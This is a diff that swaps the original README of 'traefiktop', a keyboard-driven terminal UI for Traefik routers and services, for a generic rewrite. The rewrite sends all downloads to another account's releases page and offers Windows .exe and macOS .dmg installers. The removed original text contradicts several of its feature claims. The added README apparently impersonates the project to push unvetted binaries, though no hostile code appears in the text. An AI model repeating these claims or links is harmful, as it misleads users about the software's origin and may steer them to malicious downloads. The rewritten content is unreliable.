@@ -1,170 +1,75 @@
-<div>
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="assets/logo-dark.svg">
-  <source media="(prefers-color-scheme: light)" srcset="assets/logo-light.svg">
-  <img alt="traefiktop" src="assets/logo-light.svg">
-</picture>
- 
-[![npm Downloads](https://img.shields.io/npm/dm/traefiktop?style=flat-square&label=npm+downloads)](https://www.npmjs.com/package/traefiktop)
-[![GitHub Downloads](https://img.shields.io/github/downloads/darksworm/traefiktop/total?style=flat-square&label=github+downloads)](https://github.com/darksworm/traefiktop/releases/latest)
-[![Latest Release](https://img.shields.io/github/v/release/darksworm/traefiktop?style=flat-square)](https://github.com/darksworm/traefiktop/releases/latest)
-[![License](https://img.shields.io/github/license/darksworm/traefiktop?style=flat-square)](./LICENSE)
-[![codecov](https://img.shields.io/codecov/c/github/darksworm/traefiktop?style=flat-square)](https://codecov.io/github/darksworm/traefiktop)
-</div>
+# 🛠️ traefiktop - Monitor Your Traefik Status Easily
 
-A simple, keyboard‑friendly terminal UI for exploring Traefik routers and services. Built with React + Ink, focused on clarity over chrome.
+## 📦 Download Now
+[![Download traefiktop](https://img.shields.io/badge/Download-traefiktop-blue.svg)](https://github.com/youssef-97/traefiktop/releases)
 
-## 🚀 Installation methods
+## 🚀 Getting Started
+Welcome to traefiktop! This tool helps you quickly view the status of your Traefik routers and services. With a simple interface, you can monitor and manage your Traefik setup with ease.
 
-<details>
-  <summary><strong>Install Script (Linux/macOS)</strong></summary>
+## 🎯 Features
+- **Status Overview:** Get a clear view of all your routers and services.
+- **Simple Interface:** Designed for non-technical users.
+- **Real-time Updates:** View live changes and statuses directly.
+- **Easy Navigation:** Quickly access different sections of your Traefik setup.
 
-```bash
-curl -sSL https://raw.githubusercontent.com/darksworm/traefiktop/main/install.sh | sh
-```
+## 💻 System Requirements
+To run traefiktop, you'll need:
 
-The install script automatically detects your system (including musl vs glibc on Linux) and downloads the appropriate binary from the latest release.
+- A computer with a supported operating system (Windows, macOS, or Linux).
+- Traefik installed and configured on your system.
+- A basic command-line interface (CLI) knowledge.
 
-You can also install a specific version:
-```bash
-curl -sSL https://raw.githubusercontent.com/darksworm/traefiktop/main/install.sh | sh -s -- v0.1.0
-```
-</details>
+## 📥 Download & Install
+To download traefiktop, please visit the [Releases page](https://github.com/youssef-97/traefiktop/releases). Here you will find the latest version available for download. 
 
-<details>
-  <summary><strong>Docker (Linux/macOS)</strong></summary>
+1. Click on the above link to open the Releases page.
+2. Look for the latest version.
+3. Find the right file for your operating system. The file names will clearly indicate if they are for Windows, macOS, or Linux.
+4. Click on the file to start the download.
+5. Once downloaded, locate the file in your downloads folder.
 
-Pull and run the prebuilt image from GHCR:
+### For Windows
+- If you downloaded a `.exe` file, double-click it to run the installer.
+- Follow the on-screen prompts to complete the installation.
 
-```bash
-docker run --rm -it ghcr.io/darksworm/traefiktop:latest \
-  --host https://traefik.example.org
-```
+### For macOS
+- If you downloaded a `.dmg` file, double-click it to open.
+- Drag the traefiktop application into your Applications folder.
+- Open your Applications folder and double-click on traefiktop.
 
-For self-signed endpoints, add `--insecure`. To reach a Traefik container, attach to its network:
+### For Linux
+- If you downloaded a `.tar.gz` file, extract it using the terminal.
+- Open the terminal and type: `tar -xvf traefiktop.tar.gz`.
+- Change to the directory created: `cd traefiktop`.
+- Run the application by typing: `./traefiktop`.
 
-```bash
-docker run --rm -it --network <traefik_net> ghcr.io/darksworm/traefiktop:latest \
-  --host http://traefik:8080
-```
+## ⚙️ How to Use traefiktop
+Once you have installed traefiktop, you can start using it by opening your command line interface. 
 
-Build locally instead of pulling:
+1. Open your terminal (or command prompt).
+2. Type `traefiktop` and press Enter.
+3. You will be presented with an overview of your Traefik status.
 
-```bash
-bun run docker:build
-bun run docker:run -- --host https://traefik.example.org
-```
+Navigate through the sections using the keyboard arrows. You can view details about each router and service in real-time.
 
-</details>
+## 🔍 Common Issues
+If you encounter any issues, consider the following:
 
-<details>
-  <summary><strong>npm (Linux/macOS)</strong></summary>
+- **Installation Problems:** Make sure you downloaded the correct file for your operating system.
+- **No Output Displayed:** Ensure that Traefik is running on your system.
+- **Permissions Error:** Check if you have the necessary permissions to run the application.
 
-```bash
-npm i --global traefiktop
-```
-</details>
+## 📣 Support
+If you need help or have questions, feel free to reach out. You can submit issues directly in this repository or check the discussions section for help from other users.
 
-<details>
-  <summary><strong>Homebrew (Linux/macOS)</strong></summary>
+## 📜 License
+traefiktop is open-source software. You can use and modify it under the terms of the MIT License. Please refer to the LICENSE file for more details.
 
-```bash
-brew tap darksworm/homebrew-tap
-brew install --cask traefiktop
-```
-</details>
+## 📈 Future Updates
+Stay tuned for future updates! We plan to add more features and functionality to make traefiktop even better. Regular updates will ensure that you have the latest tools and improvements.
 
-<details>
-  <summary><strong>AUR (Arch User Repository)</strong></summary>
+## 🔗 Additional Resources
+- [Traefik Documentation](https://doc.traefik.io/traefik/)
+- [GitHub Repository](https://github.com/youssef-97/traefiktop)
 
-```bash
-yay -S traefiktop-bin
-```
-</details>
-
-<details>
-  <summary><strong>Download a binary</strong></summary>
-
-Grab binaries and packages from the latest release:
-https://github.com/darksworm/traefiktop/releases/latest
-
-</details>
-
-## Screenshot
-
-<!-- Replace with a real TUI screenshot or GIF -->
-![traefiktop screenshot](assets/screenshot.png)
-
-## What it shows
-- Routers, their rules, and the services they target
-- Which router is effectively down (no healthy services)
-- The active service path (failover aware)
-- Quick, readable status with a minimal set of emojis and colors
-
-## Usage
-`--host` is required. Optionally hide routers by name with `--ignore` patterns (case‑insensitive). Use `*` at the start/end for “starts with” / “ends with”. Use `--insecure` to disable TLS verification for development against self‑signed endpoints.
-
-```bash
-traefiktop --host https://traefik.example.org \
-  --ignore staging-* \
-  --ignore *-tmp,*-old
-```
-
-Development only (self-signed endpoints):
-
-```
-traefiktop --host https://selfsigned.local --insecure
-```
-
-## Keys
-- Navigation: `j/k` or arrows
-- Page: `PgDn/PgUp`, `Ctrl+f/Ctrl+b`
-- Jump: `gg` (top), `G` (bottom), `Home/End`
-- Search: `/` to filter, `Esc` to clear
-- Sort: `s` toggles (dead first/name); `d` dead first; `n` name
-- Quit: `q` or `Ctrl+C`
-
-## Build from source
-Prereqs: Bun ≥ 1.2.20, Node ≥ 18
-
-```bash
-bun install
-# Node bundle (dist/cli.js)
-bun run build:node
-# Native binary (bun compile)
-bun run build:binary
-```
-
-## Docker
-- Prebuilt images are published for releases to `ghcr.io/darksworm/traefiktop`.
-- Local builds work cross‑platform via a multi‑stage Dockerfile.
-
-Pull and run (interactive TTY):
-
-```bash
-docker run --rm -it ghcr.io/darksworm/traefiktop:latest \
-  --host https://traefik.example.org
-```
-
-Build locally and run:
-
-```bash
-# Build (uses buildx automatically if enabled)
-bun run docker:build
-
-# Run (pass CLI flags after image name)
-bun run docker:run -- --host https://traefik.example.org
-```
-
-Multi‑arch build with buildx (optional):
-
-```bash
-docker buildx build \
-  --platform linux/amd64,linux/arm64 \
-  -t ghcr.io/darksworm/traefiktop:dev .
-```
-
-## Notes
-- API URL is mandatory. The app won’t start without `--host`.
-- Ignore patterns support: `foo*` (starts with), `*bar` (ends with), `*mid*` (contains). Pass multiple `--ignore` flags or comma‑separate values.
-- When selected, dead routers use a bright red background for better contrast. Active services are colored; inactive/down are grey.
+Thank you for choosing traefiktop! Enjoy monitoring your Traefik routers and services with ease.
